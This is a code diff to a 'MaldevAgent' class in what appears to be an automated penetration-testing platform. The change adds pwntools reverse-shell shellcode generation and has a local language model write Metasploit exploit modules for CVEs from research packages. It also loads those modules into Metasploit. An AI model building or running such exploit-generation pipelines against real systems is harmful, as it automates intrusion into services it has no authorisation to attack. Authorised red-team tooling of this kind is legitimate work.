@@ -19,6 +19,7 @@ import { nucleiTemplates } from '@shared/schema';
 import { metasploitExecutor } from '../metasploit-executor';
 import { ollamaAIClient } from '../ollama-ai-client';
 import type { VulnerabilityResearchPackage } from './research-agent';
+import { maldevToolExecutor, type BinaryAnalysis, type ROPGadget, type Shellcode } from './maldev-tool-executor';
 
 // ============================================================================
 // Types
@@ -101,26 +102,74 @@ export class MaldevAgent extends BaseTaskAgent {
   // ==========================================================================
 
   private async handleExploitDevelopment(task: TaskDefinition): Promise<TaskResult> {
-    const { researchPackage } = task.parameters as { researchPackage: VulnerabilityResearchPackage };
+    const { researchPackage, useToolIntegration } = task.parameters as { 
+      researchPackage: VulnerabilityResearchPackage;
+      useToolIntegration?: boolean;
+    };
 
     if (!researchPackage) {
       return { success: false, error: 'Missing researchPackage parameter' };
     }
 
     console.log(`[Maldev Agent] Starting exploit development for: ${researchPackage.service} ${researchPackage.version || ''}`);
+    console.log(`[Maldev Agent] Tool integration: ${useToolIntegration ? 'ENABLED' : 'DISABLED (AI-only mode)'}`);
     await this.reportProgress(task.id || 'maldev', 5, 'Analyzing research package');
 
     const artifacts: ExploitArtifact[] = [];
+    let binaryAnalysis: BinaryAnalysis | null = null;
+    let shellcodeData: Shellcode | null = null;
 
     // Phase 1: Analyze and determine what to build
     const exploitPlan = this.analyzeResearchPackage(researchPackage);
     await this.reportProgress(task.id || 'maldev', 15, `Plan: ${exploitPlan.approach}`);
 
+    // Phase 1b: Tool-Assisted Analysis (NEW - v2.4.4)
+    if (useToolIntegration) {
+      await this.reportProgress(task.id || 'maldev', 20, 'Running tool-assisted analysis...');
+      
+      // Check if we have PoC code or exploit with source
+      const pocWithCode = researchPackage.exploits.find(e => e.code && e.type === 'poc');
+      
+      if (pocWithCode) {
+        console.log('[Maldev Agent] PoC code found - performing binary analysis');
+        // Note: Binary analysis would require the actual binary file
+        // For now, we'll focus on shellcode generation which doesn't need a binary
+      }
+
+      // Generate shellcode using pwntools for the target platform
+      if (researchPackage.methodology.payloadType === 'reverse_shell') {
+        try {
+          const targetOS = researchPackage.methodology.targetOS || 'linux';
+          const lhost = process.env.LHOST || '0.0.0.0';
+          const lport = 4444;
+
+          console.log(`[Maldev Agent] Generating ${targetOS} shellcode with pwntools`);
+          shellcodeData = await maldevToolExecutor.generateShellcode(
+            targetOS as 'linux' | 'windows',
+            'x64',
+            'reverse_shell',
+            { lhost, lport }
+          );
+          
+          console.log(`[Maldev Agent] Generated shellcode: ${shellcodeData.length} bytes`);
+          await this.reportProgress(task.id || 'maldev', 25, `Generated shellcode: ${shellcodeData.length} bytes`);
+        } catch (error) {
+          console.error('[Maldev Agent] Shellcode generation failed:', error);
+          // Continue with AI-only generation
+        }
+      }
+    }
+
     // Phase 2: Generate Metasploit module if RCE/exploit material exists
     if (exploitPlan.generateMSFModule && researchPackage.exploits.length > 0) {
       await this.reportProgress(task.id || 'maldev', 30, 'Generating Metasploit module');
 
-      const msfModule = await this.generateMetasploitModule(researchPackage);
+      const msfModule = await this.generateMetasploitModuleEnhanced(
+        researchPackage,
+        binaryAnalysis,
+        shellcodeData
+      );
+      
       if (msfModule) {
         // Load into container
         const loadResult = await metasploitExecutor.loadCustomModule(
@@ -153,6 +202,9 @@ export class MaldevAgent extends BaseTaskAgent {
       data: {
         artifacts,
         payloadConfig,
+        binaryAnalysis: binaryAnalysis || undefined,
+        shellcode: shellcodeData || undefined,
+        toolIntegrationUsed: useToolIntegration || false,
         summary: `Generated ${artifacts.length} artifact(s) for ${researchPackage.service} ${researchPackage.version || ''}`,
         service: researchPackage.service,
         version: researchPackage.version,
@@ -207,6 +259,97 @@ export class MaldevAgent extends BaseTaskAgent {
     };
   }
 
+  /**
+   * Enhanced module generation with tool insights (v2.4.4)
+   */
+  private async generateMetasploitModuleEnhanced(
+    pkg: VulnerabilityResearchPackage,
+    binaryAnalysis: BinaryAnalysis | null,
+    shellcodeData: Shellcode | null
+  ): Promise<ExploitArtifact | null> {
+    const bestExploit = pkg.exploits.find(e => e.reliability === 'high') ||
+      pkg.exploits.find(e => e.reliability === 'medium') ||
+      pkg.exploits[0];
+
+    if (!bestExploit) return null;
+
+    const cveRef = pkg.cves[0]?.id || 'CUSTOM';
+    const moduleName = `${pkg.service.replace(/[^a-z0-9]/gi, '_')}_${cveRef.replace(/-/g, '_').toLowerCase()}`;
+
+    // Build enhanced prompt with tool insights
+    let enhancedContext = '';
+    
+    if (binaryAnalysis) {
+      enhancedContext += `\nBinary Analysis Results:
+- Architecture: ${binaryAnalysis.architecture}
+- Protections: NX=${binaryAnalysis.protections.nx}, PIE=${binaryAnalysis.protections.pie}, Canary=${binaryAnalysis.protections.canary}
+- Vulnerable Functions: ${binaryAnalysis.vulnerableFunctions.map(v => v.name).join(', ')}
+- Imported Functions: ${binaryAnalysis.importedFunctions.slice(0, 10).join(', ')}`;
+    }
+
+    if (shellcodeData) {
+      enhancedContext += `\nGenerated Shellcode (pwntools):
+- Platform: ${shellcodeData.platform}/${shellcodeData.architecture}
+- Length: ${shellcodeData.length} bytes
+- Payload: ${shellcodeData.payload.slice(0, 100)}...`;
+    }
+
+    const prompt = `Generate a Metasploit Framework exploit module in Ruby for the following vulnerability:
+
+Service: ${pkg.service} ${pkg.version || ''}
+CVE: ${cveRef}
+Attack Vector: ${pkg.methodology.attackVector}
+Description: ${bestExploit.description.slice(0, 500)}
+Exploit Type: ${bestExploit.type}
+Steps: ${pkg.methodology.steps.join('; ')}
+${enhancedContext}
+
+Requirements:
+1. Valid Ruby Metasploit module extending Msf::Exploit::Remote
+2. Include proper metadata (Name, Description, Author, License, References)
+3. Include check() method to verify vulnerability
+4. Include exploit() method with payload delivery${shellcodeData ? `\n5. Integrate the provided shellcode into the exploit method` : ''}
+6. Support common payloads (cmd/unix/reverse_bash, generic/shell_reverse_tcp)
+7. Include RHOSTS, RPORT options
+8. Set appropriate Rank (Normal, Good, or Excellent based on reliability)
+
+Output ONLY the Ruby code, no explanation or markdown.`;
+
+    try {
+      const aiResponse = await ollamaAIClient.complete([
+        { role: 'system', content: 'You are an expert Metasploit module developer with deep knowledge of exploitation techniques. Generate clean, working Ruby exploit modules that leverage provided tool analysis.' },
+        { role: 'user', content: prompt },
+      ]);
+
+      if (aiResponse.success && aiResponse.content && aiResponse.content.length > 100) {
+        // Clean up: remove markdown fences if present
+        let code = aiResponse.content.trim();
+        if (code.startsWith('```')) {
+          code = code.replace(/^```\w*\n/, '').replace(/\n```$/, '');
+        }
+
+        return {
+          type: 'metasploit_module',
+          name: moduleName,
+          content: code,
+          language: 'ruby',
+          modulePath: `custom/${moduleName}.rb`,
+        };
+      }
+    } catch (error) {
+      console.error('[Maldev Agent] Enhanced AI module generation failed:', error);
+    }
+
+    // Fallback: generate a template module
+    return {
+      type: 'metasploit_module',
+      name: moduleName,
+      content: this.generateTemplateModule(pkg, cveRef, moduleName),
+      language: 'ruby',
+      modulePath: `custom/${moduleName}.rb`,
+    };
+  }
+
   private async generateMetasploitModule(pkg: VulnerabilityResearchPackage): Promise<ExploitArtifact | null> {
     const bestExploit = pkg.exploits.find(e => e.reliability === 'high') ||
       pkg.exploits.find(e => e.reliability === 'medium') ||
@@ -239,14 +382,14 @@ Requirements:
 Output ONLY the Ruby code, no explanation or markdown.`;
 
     try {
-      const aiResponse = await ollamaAIClient.chat([
+      const aiResponse = await ollamaAIClient.complete([
         { role: 'system', content: 'You are an expert Metasploit module developer. Generate clean, working Ruby exploit modules.' },
         { role: 'user', content: prompt },
       ]);
 
-      if (aiResponse && aiResponse.length > 100) {
+      if (aiResponse.success && aiResponse.content && aiResponse.content.length > 100) {
         // Clean up: remove markdown fences if present
-        let code = aiResponse.trim();
+        let code = aiResponse.content.trim();
         if (code.startsWith('```')) {
           code = code.replace(/^```\w*\n/, '').replace(/\n```$/, '');
         }
